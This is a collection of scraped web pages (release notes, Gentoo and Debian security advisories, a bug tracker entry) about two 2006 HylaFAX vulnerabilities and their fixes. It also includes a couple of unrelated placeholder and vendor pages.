=== Content from www.hylafax.org_aa32a8d6_20250125_034118.html ===


##### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=HylaFAX+4.2.4+release)
* [Request account](/content/Special%3ARequestAccount)

| HylaFAX The world's most advanced open source fax server |  |
| --- | --- |

* [Home](/content/Main_Page)
* [About](/content/About_HylaFAX)
* [Developers](/content/Developers)
* [Download](/content/Download)
* [Documentation](/content/Documentation)
* [Support](/content/Support)
* [Community](/content/Community)
* [Get Involved](/content/Get_Involved)

# HylaFAX 4.2.4 release

The HylaFAX development team is pleased to announce our 4.2.4
patch level release! As always, our sincerest thanks go to all who
participate and provide feedback.

This document is intended to describe the significant differences
between hylafax-4.2.4 and older releases, point out any known
incompatibilites and issues, and provide the reader with directions to
further resources regarding HylaFAX.

## Contents

* [1 NEW FEATURES](#NEW_FEATURES)
* [2 KNOWN ISSUES](#KNOWN_ISSUES)
* [3 INCOMPATIBILITIES](#INCOMPATIBILITIES)
* [4 WHO SHOULD UPGRADE?](#WHO_SHOULD_UPGRADE.3F)
* [5 HYLAFAX BINARY PACKAGES](#HYLAFAX_BINARY_PACKAGES)
* [6 SUPPORT](#SUPPORT)
  + [6.1 Join and participate in a HylaFAX mailing list](#Join_and_participate_in_a_HylaFAX_mailing_list)
  + [6.2 Read the on-line documentation and resources](#Read_the_on-line_documentation_and_resources)
  + [6.3 Review HylaFAX CVS](#Review_HylaFAX_CVS)
  + [6.4 Report confirmed bugs, feature requests, and submit patches](#Report_confirmed_bugs.2C_feature_requests.2C_and_submit_patches)
## NEW FEATURES

* Security fix - hfaxd vulnerability CVE-2005-3538
* Security fix - script vulnerability CVE-2005-3539
* PAM support on Solaris
* Local/GMT timezone support in JOBFMT/RECVFMT formatters
* Numerous other enhancements and bugfixes (see CHANGES)

## KNOWN ISSUES

* Please refer to HylaFAX Bugzilla for a detailed list of issues.

## INCOMPATIBILITIES

* Some modem config files generated from earlier versions' config file prototypes may contain Class1TCFRecvHack. This is no longer desireable for production use, and this feature should now only be used for debugging purposes.
* The time value of %Z in jobfmt/recvfmt is now returned in GMT time when GMT is requested, and in local time when local time is requested. Previously, %Z was always returned in local time, even if GMT had been requested.
* If upgrading from any releases other than 4.2.2 or 4.2.3, be advised that CIDName/CIDNumber are now part of a larger CallID framework.
* libtiff-3.6.1 is fatally flawed when dealing with Group 3 images. Don't use it as-is. See: <http://bugs.hylafax.org/bugzilla/show_bug.cgi?id=500>

## WHO SHOULD UPGRADE?

* For security reasons, everyone should consider upgrading to this 4.2.4 release as soon as possible.

## HYLAFAX BINARY PACKAGES

Binary packages for some operating systems and platforms are available.
Please see:

* ftp://ftp.hylafax.org/binary/
* <http://www.hylafax.org/content/Binary_Packages>
* [http://www.hylafax.org/content/Handbook:Binary\_Package\_Install](http://www.hylafax.org/content/Handbook%3ABinary_Package_Install)

If you are able and willing to produce a binary package of HylaFAX for
general distribution, and one is not already available for your platform/OS,
then you are invited to add it to the Binary\_Packages wiki page at
www.hylafax.org.

## SUPPORT

HylaFAX has numerous public support resources available. The user is
encouraged to utilize the manpage documentation before turning to
other support arenas. However, if other support is desired, or if you
would like to actively take part in the HylaFAX community, you are
invited to:

### Join and participate in a HylaFAX mailing list

See: <http://www.hylafax.org/content/Mailing_Lists>

When corresponding about this software, please always specify:

* what version of HylaFAX you have,
* what system you're running on (if it is Linux please name the distribution)
* if the problem is modem-related, identify it and the firmware rev For example: "HylaFAX v4.0pl2 under RedHat Linux 4.2 with gcc 2.7.2; ZyXEL 1496E with 6.11a firmware."

### Read the on-line documentation and resources

See: <http://www.hylafax.org/content/Documentation>

### Review HylaFAX CVS

See: <http://www.hylafax.org/content/Developers>

### Report confirmed bugs, feature requests, and submit patches

See: <http://bugs.hylafax.org/bugzilla>

Thanks,

The HylaFAX development team

Retrieved from "<https://legacy.hylafax.org/index.php?title=HylaFAX_4.2.4_release&oldid=1661>"

---

This page was last edited on 6 January 2006, at 14:56.

---

* [Page](/content/HylaFAX_4.2.4_release)
* [Discussion](/index.php?title=Talk:HylaFAX_4.2.4_release&action=edit&redlink=1)
* [View source](/index.php?title=HylaFAX_4.2.4_release&action=edit)
* [History](/index.php?title=HylaFAX_4.2.4_release&action=history)

* [What links here](/content/Special%3AWhatLinksHere/HylaFAX_4.2.4_release)
* [Related changes](/content/Special%3ARecentChangesLinked/HylaFAX_4.2.4_release)
* Upload file
* [Special pages](/content/Special%3ASpecialPages)

[![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](//www.mediawiki.org/)
[![Attribution-ShareAlike 2.5](https://creativecommons.org/images/public/somerights20.png)](https://creativecommons.org/licenses/by-sa/2.5/)

---

Project hosted by [iFAX Solutions](http://www.ifax.com)



=== Content from www.gentoo.org_ae9c89d7_20250125_034115.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# HylaFAX: Multiple vulnerabilities — GLSA **200601-03**

HylaFAX is vulnerable to arbitrary code execution and unauthorized access
vulnerabilities.

### Affected packages

| Package | **net-misc/hylafax** on all architectures |
| --- | --- |
| Affected versions | < **4.2.3-r1** |
| Unaffected versions | >= **4.2.3-r1** |

### Background

HylaFAX is an enterprise-class system for sending and receiving
facsimile messages and for sending alpha-numeric pages.

### Description

Patrice Fournier discovered that HylaFAX runs the notify script on
untrusted user input. Furthermore, users can log in without a password
when HylaFAX is installed with the pam USE-flag disabled.

### Impact

An attacker could exploit the input validation vulnerability to
run arbitrary code as the user running HylaFAX, which is usually uucp.
The password vulnerability could be exploited to log in without proper
user credentials.

### Workaround

There is no known workaround at this time.

### Resolution

All HylaFAX users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-misc/hylafax-4.2.3-r1"
```
### References

* [CVE-2005-3538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3538)
* [CVE-2005-3539](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3539)
* [HylaFAX release announcement](https://www.hylafax.org/content/HylaFAX_4.2.4_release)

**Release date**

January 06, 2006

**Latest revision**

January 06, 2006: 01

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [116389](https://bugs.gentoo.org/show_bug.cgi?id=116389)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.vupen.com_1327ce26_20250125_034120.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from www.mandriva.com_28be34c7_20250125_034120.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from www.hylafax.org_2214ed59_20250126_054439.html ===


##### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=HylaFAX+4.2.4+release)
* [Request account](/content/Special%3ARequestAccount)

| HylaFAX The world's most advanced open source fax server |  |
| --- | --- |

* [Home](/content/Main_Page)
* [About](/content/About_HylaFAX)
* [Developers](/content/Developers)
* [Download](/content/Download)
* [Documentation](/content/Documentation)
* [Support](/content/Support)
* [Community](/content/Community)
* [Get Involved](/content/Get_Involved)

# HylaFAX 4.2.4 release

The HylaFAX development team is pleased to announce our 4.2.4
patch level release! As always, our sincerest thanks go to all who
participate and provide feedback.

This document is intended to describe the significant differences
between hylafax-4.2.4 and older releases, point out any known
incompatibilites and issues, and provide the reader with directions to
further resources regarding HylaFAX.

## Contents

* [1 NEW FEATURES](#NEW_FEATURES)
* [2 KNOWN ISSUES](#KNOWN_ISSUES)
* [3 INCOMPATIBILITIES](#INCOMPATIBILITIES)
* [4 WHO SHOULD UPGRADE?](#WHO_SHOULD_UPGRADE.3F)
* [5 HYLAFAX BINARY PACKAGES](#HYLAFAX_BINARY_PACKAGES)
* [6 SUPPORT](#SUPPORT)
  + [6.1 Join and participate in a HylaFAX mailing list](#Join_and_participate_in_a_HylaFAX_mailing_list)
  + [6.2 Read the on-line documentation and resources](#Read_the_on-line_documentation_and_resources)
  + [6.3 Review HylaFAX CVS](#Review_HylaFAX_CVS)
  + [6.4 Report confirmed bugs, feature requests, and submit patches](#Report_confirmed_bugs.2C_feature_requests.2C_and_submit_patches)
## NEW FEATURES

* Security fix - hfaxd vulnerability CVE-2005-3538
* Security fix - script vulnerability CVE-2005-3539
* PAM support on Solaris
* Local/GMT timezone support in JOBFMT/RECVFMT formatters
* Numerous other enhancements and bugfixes (see CHANGES)

## KNOWN ISSUES

* Please refer to HylaFAX Bugzilla for a detailed list of issues.

## INCOMPATIBILITIES

* Some modem config files generated from earlier versions' config file prototypes may contain Class1TCFRecvHack. This is no longer desireable for production use, and this feature should now only be used for debugging purposes.
* The time value of %Z in jobfmt/recvfmt is now returned in GMT time when GMT is requested, and in local time when local time is requested. Previously, %Z was always returned in local time, even if GMT had been requested.
* If upgrading from any releases other than 4.2.2 or 4.2.3, be advised that CIDName/CIDNumber are now part of a larger CallID framework.
* libtiff-3.6.1 is fatally flawed when dealing with Group 3 images. Don't use it as-is. See: <http://bugs.hylafax.org/bugzilla/show_bug.cgi?id=500>

## WHO SHOULD UPGRADE?

* For security reasons, everyone should consider upgrading to this 4.2.4 release as soon as possible.

## HYLAFAX BINARY PACKAGES

Binary packages for some operating systems and platforms are available.
Please see:

* ftp://ftp.hylafax.org/binary/
* <http://www.hylafax.org/content/Binary_Packages>
* [http://www.hylafax.org/content/Handbook:Binary\_Package\_Install](http://www.hylafax.org/content/Handbook%3ABinary_Package_Install)

If you are able and willing to produce a binary package of HylaFAX for
general distribution, and one is not already available for your platform/OS,
then you are invited to add it to the Binary\_Packages wiki page at
www.hylafax.org.

## SUPPORT

HylaFAX has numerous public support resources available. The user is
encouraged to utilize the manpage documentation before turning to
other support arenas. However, if other support is desired, or if you
would like to actively take part in the HylaFAX community, you are
invited to:

### Join and participate in a HylaFAX mailing list

See: <http://www.hylafax.org/content/Mailing_Lists>

When corresponding about this software, please always specify:

* what version of HylaFAX you have,
* what system you're running on (if it is Linux please name the distribution)
* if the problem is modem-related, identify it and the firmware rev For example: "HylaFAX v4.0pl2 under RedHat Linux 4.2 with gcc 2.7.2; ZyXEL 1496E with 6.11a firmware."

### Read the on-line documentation and resources

See: <http://www.hylafax.org/content/Documentation>

### Review HylaFAX CVS

See: <http://www.hylafax.org/content/Developers>

### Report confirmed bugs, feature requests, and submit patches

See: <http://bugs.hylafax.org/bugzilla>

Thanks,

The HylaFAX development team

Retrieved from "<https://legacy.hylafax.org/index.php?title=HylaFAX_4.2.4_release&oldid=1661>"

---

This page was last edited on 6 January 2006, at 14:56.

---

* [Page](/content/HylaFAX_4.2.4_release)
* [Discussion](/index.php?title=Talk:HylaFAX_4.2.4_release&action=edit&redlink=1)
* [View source](/index.php?title=HylaFAX_4.2.4_release&action=edit)
* [History](/index.php?title=HylaFAX_4.2.4_release&action=history)

* [What links here](/content/Special%3AWhatLinksHere/HylaFAX_4.2.4_release)
* [Related changes](/content/Special%3ARecentChangesLinked/HylaFAX_4.2.4_release)
* Upload file
* [Special pages](/content/Special%3ASpecialPages)

[![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](//www.mediawiki.org/)
[![Attribution-ShareAlike 2.5](https://creativecommons.org/images/public/somerights20.png)](https://creativecommons.org/licenses/by-sa/2.5/)

---

Project hosted by [iFAX Solutions](http://www.ifax.com)



=== Content from www.debian.org_51faefc5_20250125_034115.html ===


---

[[Date Prev](msg00003.html)][[Date Next](msg00005.html)]
[[Thread Prev](msg00003.html)][[Thread Next](msg00005.html)]
[[Date Index](maillist.html#00004)]
[[Thread Index](threads.html#00004)]

# [SECURITY] [DSA 933-1] New hylafax packages fix arbitrary command execution

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 933-1] New hylafax packages fix arbitrary command execution
* *From*: Michael Stone <mstone@klecker.debian.org>
* *Date*: Tue, 10 Jan 2006 04:24:23 +0100
* *Message-id*: <[[🔎]](/msgid-search/E1EwA7T-0005Fy-3a%40klecker.debian.org) [E1EwA7T-0005Fy-3a@klecker.debian.org](msg00004.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- --------------------------------------------------------------------------
Debian Security Advisory DSA 933-1                     security@debian.org
<http://www.debian.org/security/>                              Michael Stone
January 9, 2006                         <http://www.debian.org/security/faq>
- --------------------------------------------------------------------------

Package        : hylafax
Vulnerability  : arbitrary command execution
Problem-Type   : local
Debian-specific: no
CVE ID         : CVE-2005-3539

Patrice Fournier found that hylafax passes unsanitized user data in the
notify script, allowing users with the ability to submit jobs to run
arbitrary commands  with the privileges of the hylafax server.

For the old stable distribution (woody) this problem has been fixed in
version 4.1.1-4woody1.

For the stable distribution (sarge) this problem has been fixed in
version 4.2.1-5sarge3.

For the unstable distribution the problem has been fixed in version
4.2.4-2.

We recommend that you upgrade your hylafax package.

Upgrade Instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 3.0 alias woody
- --------------------------------

  Source archives:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.1.1-4woody1.dsc>
      Size/MD5 checksum:      800 c9fd457c2782971a41c8328435b00ece
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.1.1-4woody1.diff.gz>
      Size/MD5 checksum:   116777 a2c212abd4a22134b673b3df345cb779
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.1.1.orig.tar.gz>
      Size/MD5 checksum:  1287689 1ed081750be70a800708699b7568e17e

  Architecture independent components:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-doc_4.1.1-4woody1_all.deb>
      Size/MD5 checksum:   318384 bf2352b27b55b6a6b66acd8184864ed5

  Alpha architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_alpha.deb>
      Size/MD5 checksum:   556394 4acfe414a92ca39dd08d945927134fde
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_alpha.deb>
      Size/MD5 checksum:  1362704 7c5d2805a86e35f77fbdc320608eae21

  ARM architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_arm.deb>
      Size/MD5 checksum:   445742 bd7631c263e79ba1fa222616fab0814c
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_arm.deb>
      Size/MD5 checksum:  1096024 a5bccc072005832e21a63af6cd355d80

  Intel IA-32 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_i386.deb>
      Size/MD5 checksum:   462478 a1b1d1ffb63fa002602fa817985c10d4
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_i386.deb>
      Size/MD5 checksum:  1132898 f7f7933a5c26c69048628d20c6d8c6e2

  Intel IA-64 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_ia64.deb>
      Size/MD5 checksum:   615750 9dd3e91618a0b7ff630fc8e73472be90
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_ia64.deb>
      Size/MD5 checksum:  1491998 fcfa52b30bf30151ce3d9c9c283738b2

  HP Precision architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_hppa.deb>
      Size/MD5 checksum:   501764 532a01a8b1c509fff8640a63743f27b0
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_hppa.deb>
      Size/MD5 checksum:  1231584 2d3a3a7072c00e4fc71bb48045aac459

  Motorola 680x0 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_m68k.deb>
      Size/MD5 checksum:   451356 52f1e0515d0dc3f88b25de500aa8916c
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_m68k.deb>
      Size/MD5 checksum:  1100320 294aa660f86c7090eb0092755a788009

  PowerPC architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_powerpc.deb>
      Size/MD5 checksum:   450900 349b2498e9ca56c63e219911b79e2953
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_powerpc.deb>
      Size/MD5 checksum:  1104560 48b998cf768a2ff858c948e5892b32c4

  IBM S/390 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_s390.deb>
      Size/MD5 checksum:   441344 51762120b318ed4c800a12e28242b5fa
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_s390.deb>
      Size/MD5 checksum:  1087136 ba81545268b85fa2783814ca8322d3b3

  Sun Sparc architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.1.1-4woody1_sparc.deb>
      Size/MD5 checksum:   433674 4786a267f600ba71c8f9c80a1f371439
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.1.1-4woody1_sparc.deb>
      Size/MD5 checksum:  1082890 6bdc5a6359c4b953f5127031af69cbe2

Debian GNU/Linux 3.1 alias sarge
- --------------------------------

  Source archives:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.2.1-5sarge3.dsc>
      Size/MD5 checksum:      746 1202e740bcb10a01977c98f6967d2da4
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.2.1-5sarge3.diff.gz>
      Size/MD5 checksum:    51922 e7d0531c64d48a9907e1a9c73b882bff
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax_4.2.1.orig.tar.gz>
      Size/MD5 checksum:  1412035 05430e41a279d0fff6d6e4b444440829

  Architecture independent components:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-doc_4.2.1-5sarge3_all.deb>
      Size/MD5 checksum:   372578 70db2ce1b777e475cbe3335abc31a5a6

  Alpha architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_alpha.deb>
      Size/MD5 checksum:   373996 440dedf0a21a7ea99573ff9a0c8eb675
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_alpha.deb>
      Size/MD5 checksum:   863606 cff4540597762579538d71e447b09f01

  AMD64 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_amd64.deb>
      Size/MD5 checksum:   350894 a8040ccfde418e5cdf9f353f8b7471d9
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_amd64.deb>
      Size/MD5 checksum:   801152 977bdc76fc44339599770227ba93befc

  ARM architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_arm.deb>
      Size/MD5 checksum:   342534 a79825720236fdafac2c6a7841b1fdec
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_arm.deb>
      Size/MD5 checksum:   808884 10810889ed1c044fb1fec91af88184b2

  Intel IA-32 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_i386.deb>
      Size/MD5 checksum:   348172 0b3837a725542ab94fe7525beb54926d
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_i386.deb>
      Size/MD5 checksum:   805786 05e61ba137faedbaf4a6d4b3faf0cce6

  Intel IA-64 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_ia64.deb>
      Size/MD5 checksum:   402530 a592a7397d1b75dc541584e3e10cbd23
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_ia64.deb>
      Size/MD5 checksum:   924558 eb3701170b63c4ca617c93c74aa59f76

  HP Precision architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_hppa.deb>
      Size/MD5 checksum:   402386 7ec015549d9aa57e5a8e037deb6edb32
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_hppa.deb>
      Size/MD5 checksum:   911520 948195eaaf686a5cffa3237df90d8504

  Motorola 680x0 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_m68k.deb>
      Size/MD5 checksum:   345380 635f021fb40dbdd09c138608e64c309c
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_m68k.deb>
      Size/MD5 checksum:   784438 3bc0f358363b448d3f8e72f95743a9fe

  Big endian MIPS architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_mips.deb>
      Size/MD5 checksum:   352748 a65a3fcfffc4ec111fe4237a92734254
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_mips.deb>
      Size/MD5 checksum:   836146 17146c51624cfc1f7c7eaac74c483f21

  Little endian MIPS architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_mipsel.deb>
      Size/MD5 checksum:   350272 d5d512363681880db5e3d587021cab19
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_mipsel.deb>
      Size/MD5 checksum:   831156 b06e0395c7b347093f2f9e1fe9673b91

  PowerPC architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_powerpc.deb>
      Size/MD5 checksum:   356672 778a434ea9e2e73d85ee8b7eaec4062c
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_powerpc.deb>
      Size/MD5 checksum:   819686 4e82d570b0ffe822945814f90a5c175c

  IBM S/390 architecture:

    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-client_4.2.1-5sarge3_s390.deb>
      Size/MD5 checksum:   339480 5afce0e8172e75b1b39d0086f69c5e0a
    <http://security.debian.org/pool/updates/main/h/hylafax/hylafax-server_4.2.1-5sarge3_s390.deb>
      Size/MD5 checksum:   767944 bc881199411dce80be644491b031af07

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (GNU/Linux)

iQCVAwUBQ8MmzA0hVr09l8FJAQKeqwQAruYHiI3B0QVio1gDn7DE7eUsQMs1vvCI
AVEXqjqyeWNhed9nJ8d0UjhlNvoyq2/WaN1pBdsZqJzEN5pzxJOaZtwZEWayss91
gvYJyH9Kg21sslU9RIOglIg/4K5EabKDi3GhqaqWutFiT0KTBLf77TuUidYYwTS5
NCWqBx5C0c4=
=IYBj
-----END PGP SIGNATURE-----

```

---



=== Content from bugs.hylafax.org_32e912c3_20250125_034113.html ===

[![Home](skins/custom/Hylafax-clever-frog.gif "Back to the HylaFAX Bugzilla home page")](http://bugs.hylafax.org/)
Bugzilla
[New bug](enter_bug.cgi) ·
[Reports](report.cgi) ·
[Requests](request.cgi) ·
[Search](query.cgi) ·bug #

[Log In](index.cgi?GoAheadAndLogIn=1) | [New Account](createaccount.cgi)

# Bugzilla Bug 719

## Unsanitised user-supplied data passed to eval in notify and faxrcvd

### Last modified: 2006-01-20 12:06:15

*First*
*Last*
*Prev*
*Next*

*No search results available*
     [Search page](query.cgi)
     [Enter new bug](enter_bug.cgi)

---

